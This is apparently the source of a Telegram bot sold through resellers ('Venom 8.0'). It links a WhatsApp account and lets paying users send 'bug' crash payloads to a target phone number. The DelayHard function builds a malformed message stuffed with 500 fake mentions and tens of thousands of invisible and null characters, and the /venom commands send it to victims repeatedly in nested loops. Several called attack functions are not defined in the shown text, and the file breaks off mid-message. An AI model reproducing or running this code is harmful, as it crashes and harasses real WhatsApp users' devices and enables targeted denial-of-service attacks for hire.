/*
╔═══════════════════════════════════════════════════════════════╗
║   🔥 VENOM 8.0 PRO - RESELLER EDITION 🔥                     ║
║   👑 DEVELOPER: HeriKeyzenlocker                             ║
║   📍 BANJARAN SUDOM - LAMPUNG SELATAN                        ║
║   🗿 KHUSUS RESELLER - HANYA BISA ADD PREMIUM                ║
╚═══════════════════════════════════════════════════════════════╝
*/

const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVenom = fs.readFileSync('./Venom.jpeg')
const crypto = require('crypto');
const chalk = require('chalk');
const global = require('./VenomConfig.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./VenomDB/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./VenomDB/premium.json'));
let OwnerUsers = JSON.parse(fs.readFileSync('./VenomDB/Owner.json'));
let adminUsers = JSON.parse(fs.readFileSync('./VenomDB/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./VenomDB/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./VenomDB/security.json'));
let resellerUsers = JSON.parse(fs.readFileSync('./VenomDB/reseller.json'));
const owner = global.owner;
const cooldowns = new Map();
const axios = require('axios');
const BOT_TOKEN = global.botToken;
const startTime = new Date();

function getOnlineDuration() {
  let onlineDuration = new Date() - startTime;
  let seconds = Math.floor((onlineDuration / 1000) % 60);
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60);
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;
  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);

// ============ VALIDASI TOKEN KE DATABASE GITHUB ============
async function fetchValidTokens() {
  try {
    const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/HeriTezzRorw2/Token.js/refs/heads/main/Tokens.json";
    
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (!response.data || !response.data.tokens) {
      console.error(chalk.red("❌ Struktur Token.json tidak valid."));
      return [];
    }

    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token Tidak Di Terima Oleh Bot!!!"));
    process.exit(1);
  }

  console.log(chalk.green("Token Anda Di Kenali Venom - Reseller Edition!!!"));
  startBot();
}

function startBot() {
  console.log(chalk.green("Token Kamu Sudah Di Confirm Oleh Venom - Reseller!!!"));
}

validateToken();

let sock;
let whatsappStatus = false;

async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VenomPrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        console.log('Connected to WhatsApp!');
    }
  });
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }

  const { state, saveCreds } = await useMultiFileAuthState('VenomPrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              if (fs.existsSync('./VenomPrivate/creds.json')) {
                  fs.unlinkSync('./VenomPrivate/creds.json');
              }
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync('./VenomPrivate/creds.json')) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber);
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `
╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮
│➻ Nᴜᴍʙᴇʀ : ${number}
│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
╰───────────────────────╯`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}

function savePremiumUsers() {
  fs.writeFileSync('./VenomDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveOwnerUsers() {
  fs.writeFileSync('./VenomDB/Owner.json', JSON.stringify(OwnerUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./VenomDB/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveResellerUsers() {
  fs.writeFileSync('./VenomDB/reseller.json', JSON.stringify(resellerUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./VenomDB/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./VenomDB/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./VenomDB/premium.json', (data) => (premiumUsers = data));
watchFile('./VenomDB/admin.json', (data) => (adminUsers = data));
watchFile('./VenomDB/banned.json', (data) => (bannedUser = data));
watchFile('./VenomDB/superVip.json', (data) => (superVip = data));
watchFile('./VenomDB/security.json', (data) => (securityUser = data));
watchFile('./VenomDB/reseller.json', (data) => (resellerUsers = data));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ----------- ( START FUNCTION ) ----------------------\\
async function DelayHard(sock, target) {
  const generateLocationMessage = {
    viewOnceMessageV2: {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "X-Core System Update",
          contextInfo: {
            mentionedJid: Array(500).fill("0@s.whatsapp.net"),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999,
            isForwarded: 0,
            quotedMessage: {
              adminInviteMessage: { 
                inviteCode: "\u200E".repeat(20000),
                caption: "\u200B".repeat(20000),
                expiration: 1735689600
              }
            },
            externalAdReply: {
              title: "System Processing...",
              body: "Critical Error Found",
              mediaType: 10,
              renderLargerThumbnail: true,
              sourceUrl: "https://t.me"
            }
          }
        },
        nativeFlowMessage: {
          buttons: [{
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "Click to Fix",
              sections: [{ 
                rows: Array(30).fill({ 
                  title: "Data_Crash", 
                  id: "\u0000".repeat(5000)
                }) 
              }]
            })
          }],
          messageParamsJson: "{}"
        }
      }
    }
  }

  const msg = await generateWAMessageFromContent(target, generateLocationMessage, {
    userJid: target,
    messageId: undefined
  })

  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: target,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    })
    console.log(`Payload Terkirim ke ${target} - Burst: ${i+1}`)
  }
}

// ==== VENOM FUNCTIONS ==== \\
async function VenomIOS(target) {
  for (let i = 0; i < 10; i++) {
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
    await DelayHard(sock, target);
  }
}

async function VenomOri(target) {
  for (let i = 0; i <= 88; i++) {
    await ForceClose(sock, target);
    await ForceClose(sock, target);
  }
}

async function VenomDelayInvis(target) {
  for (let i = 0; i <= 80; i++) {
    await VenomBroadcast(target, mention = true);
    await VenomBroadcast(target, mention = true);
  }
}

async function VenomBeta(target) {
  for (let i = 0; i <= 80; i++) {
    await VenomDeviceCrash(target, Ptcp = true);
    await VenomDeviceCrash(target, Ptcp = true);
  }
}

async function VenomCrashChat(target) {
  for (let i = 0; i <= 100; i++) {
    await VenomDelayMess(target, Ptcp = true);
    await VenomDelayMess(target, Ptcp = true);
  }
}

async function VenomCrashUi(target) {
  for (let i = 0; i <= 100; i++) {
    await UiNew(target);
    await UiNew(target);
  }
}

async function VenomPhone(target) {
  for (let i = 0; i <= 5; i++) {
    await VenomIOS(target);
  }
}

async function VenomChannel(target) {
  for (let i = 0; i <= 5; i++) {
    await VenomCrashCH(target);
    await VenomCrashCH2(target);
  }
}

async function VenomGroup(groupJid) {
  for (let i = 0; i <= 5; i++) {
    await VenomBugIns(groupJid);
  }
}

async function callbug(target) {
  for (let i = 0; i <= 5; i++) {
    await spamcall(target);
    await sleep(3000);
  }
}
// ==== (END VENOM FUNCTIONS) ==== \\

// Fungsi pengecekan akses untuk Reseller
function isReseller(userId) {
  return resellerUsers.includes(userId);
}

function isPremium(userId) {
  return premiumUsers.includes(userId) && !bannedUser.includes(userId);
}

function isOwner(userId) {
  return owner.includes(userId) || OwnerUsers.includes(userId);
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;

  let ligma = `
𖤊───⪩  𝐕𝐄𝐍𝐎𝐌 𝟖.𝟎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @HeriKeyzenlocker
│➼ Role : ${isReseller(senderId) ? "✅ RESELLER" : "❌ USER BIASA"}
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭──────────────────────╮
│   「  𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐄𝐍𝐔  」   │
│      /addprem <ID>      │
│      /delprem <ID>      │
│      /cekprem           │
│      /info              │
╰──────────────────────╯
`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  { text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮", callback_data: "bugmenu" },
                  { text: "〢𝐓𝐨𝐨𝐥𝐬", callback_data: "toolsmenu" }
              ],
              [
                  { text: "〢𝐂𝐡𝐚𝐧𝐧𝐞𝐥", url: "https://t.me/Venominfobot" }
              ]
          ]
      }
  });
});

bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝐕𝐄𝐍𝐎𝐌 𝟖.𝟎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Role : ${isReseller(senderId) ? "✅ RESELLER" : "❌ USER BIASA"}
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭────── 「   𝐁𝐮𝐠 𝐌𝐞𝐧𝐮   」 ──────╮
│➥ /venomori 62×××
│➥ /venombeta 62×××
│➥ /venombussines 62×××
│➥ /venomios 62×××
│➥ /venomdelay 62×××
│➥ /venomui 62×××
╰──────────────────────╯
╭──「  𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩/𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」──╮
│➢ /venomgroup <Link>
│➢ /venomch <Newsletter>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [{ text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭", url: "https://t.me/HeriKeyzenlocker" }]
          ]
      }
  });
});

bot.onText(/\/toolsmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝐕𝐄𝐍𝐎𝐌 𝟖.𝟎 𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Role : ${isReseller(senderId) ? "✅ RESELLER" : "❌ USER BIASA"}
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭─────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」──────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [{ text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭", url: "https://t.me/HeriKeyzenlocker" }]
          ]
      }
  });
});

//========================================================\\
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Bukan Owner!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Pakai Code Negara\nContoh: /addbot 62×××.");
  }
  const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh : /addbot 62×××.");
  }

  await getSessions(bot, chatId, numberTarget)
});

bot.onText(/^\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Akses Tolol...');
    }

    const q = match && match[1] ? match[1].trim() : null;
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai:\nContoh: /fixedbug 62xxx`);
    }

    let pepec = q.replace(/[^0-9]/g, "");
    if (!pepec.startsWith("62")) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }

    const target = `${pepec}@s.whatsapp.net`;
    const clearBugText = "𝐕𝐄𝐍𝐎𝐌 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n" + "\n".repeat(300) + "𝐕𝐄𝐍𝐎𝐌 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆";

    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { text: clearBugText });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Venom!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});

// VENOM BUG COMMANDS
bot.onText(/\/venomori(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Format: /venomori 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Format: /venomori 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) {
        await VenomDelayInvis(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /venomori
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});

bot.onText(/\/venombeta(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Format: /venombeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Format: /venombeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) {
        await VenomBeta(formatedNumber);
        await VenomDelayInvis(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /venombeta
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});

bot.onText(/\/venombussines(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Format: /venombussines 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Format: /venombussines 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 3; i++) {
        await VenomDelayInvis(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /venombussines
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});

bot.onText(/\/venomios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Format: /venomios 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Format: /venomios 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 2; i++) {
        await VenomPhone(formatedNumber);
        await VenomCrashUi(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /venomios
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});

bot.onText(/\/venomdelay(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu!!!");
    }
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Format: /venomdelay 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Format: /venomdelay 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 2; i++) {
        await VenomDelayInvis(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /venomdelay
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});

bot.onText(/\/venomui(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu!!!");
    }
    if (!isPremium(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Format: /venomui 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Format: /venomui 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) {
        await VenomCrashUi(formatedNumber);
        await VenomDelayInvis(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
